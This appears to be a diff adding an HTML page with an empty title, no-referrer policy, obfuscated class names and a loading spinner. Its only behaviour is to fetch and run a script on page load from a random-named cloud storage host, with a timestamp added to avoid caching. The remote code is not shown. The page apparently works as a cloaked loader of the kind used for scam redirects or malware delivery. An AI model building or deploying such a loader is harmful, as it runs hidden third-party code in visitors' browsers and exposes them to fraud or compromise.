@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="referrer" content="no-referrer">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='40,15 70,15 55,45 80,45 30,90 45,55 20,55' fill='%23ffc107'/></svg>">
+
+  <title></title>
+
+  <style>
+    #load {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(255, 255, 255, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .kz { display: flex; gap: 12px; }
+    .pz {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      animation: xb 0.6s infinite alternate;
+    }
+    .pz:nth-child(1) { background: #e91e63; animation-delay: 0s; }
+    .pz:nth-child(2) { background: #2196f3; animation-delay: 0.2s; }
+    .pz:nth-child(3) { background: #f9d402; animation-delay: 0.4s; }
+    @keyframes xb {
+      from { transform: translateY(0); opacity: 0.6; }
+      to { transform: translateY(-15px); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div id="load">
+    <div class="kz">
+      <div class="pz"></div>
+      <div class="pz"></div>
+      <div class="pz"></div>
+    </div>
+  </div>
+
+  <div id="box"></div>
+
+  <script>
+    const s = document.createElement("script");
+    s.src = "//dfasdz-1367200107.cos.accelerate.myqcloud.com/ptjm.js?v=" + Date.now();
+    document.body.appendChild(s);
+  </script>
+</body>
+</html>
